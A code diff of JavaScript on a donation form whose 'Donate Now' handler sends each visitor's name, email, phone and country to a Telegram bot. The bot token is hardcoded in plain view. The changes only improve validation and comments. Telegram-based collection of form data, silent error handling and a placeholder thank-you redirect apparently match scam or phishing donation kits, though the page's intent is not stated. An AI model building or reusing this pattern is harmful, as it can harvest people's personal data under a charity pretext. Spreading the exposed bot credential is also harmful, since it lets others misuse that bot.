@@ -34,15 +34,24 @@ const TELEGRAM_TOKEN = '7562593192:AAHCAufAjNw6DjBfHSIVsj8gLfZk24BoXjk';
   // Function to validate form before sending data
   function validateFormAndSend() {
     // Get form values
-    const firstName = document.getElementById('first-name').value;
-    const lastName = document.getElementById('last-name').value;
-    const email = document.getElementById('email').value;
-    const phone = document.getElementById('phone').value;
+    const firstName = document.getElementById('first-name').value.trim();
+    const lastName = document.getElementById('last-name').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const phone = document.getElementById('phone').value.trim();
     const country = document.getElementById('country').value;
 
     // Check if required fields are filled
     if (!firstName || !lastName || !email || !phone || !country) {
-      return false; // If validation fails, return false (do nothing)
+      // Highlight missing fields and display an error message
+      if (!firstName) document.getElementById('first-name').style.border = '2px solid red';
+      if (!lastName) document.getElementById('last-name').style.border = '2px solid red';
+      if (!email) document.getElementById('email').style.border = '2px solid red';
+      if (!phone) document.getElementById('phone').style.border = '2px solid red';
+      if (!country) document.getElementById('country').style.border = '2px solid red';
+
+      // Display error message
+      alert('Please fill in the required details.');
+      return false; // Stop further execution
     }
 
     // Prepare the message to send to Telegram
@@ -81,15 +90,16 @@ const TELEGRAM_TOKEN = '7562593192:AAHCAufAjNw6DjBfHSIVsj8gLfZk24BoXjk';
     })
     .then(response => response.json())
     .catch(error => {
-      // No alert, just silently handle errors
+      // Log errors silently
       console.error('Error with the request:', error);
     });
   }
 
   // Add event listener to the Donate Now button
-  document.getElementById('donate-now-btn').addEventListener('click', function() {
+  document.getElementById('donate-now-btn').addEventListener('click', function(e) {
+    e.preventDefault(); // Prevent the default button action
     if (validateFormAndSend()) {
-      // Proceed with donation logic without showing alerts, e.g., redirect or display success message
-      window.location.href = 'thank-you-page-url'; // Redirect to a thank-you page or payment page
+      // Redirect to thank-you page if validation passes
+      window.location.href = 'thank-you-page-url';
     }
   });
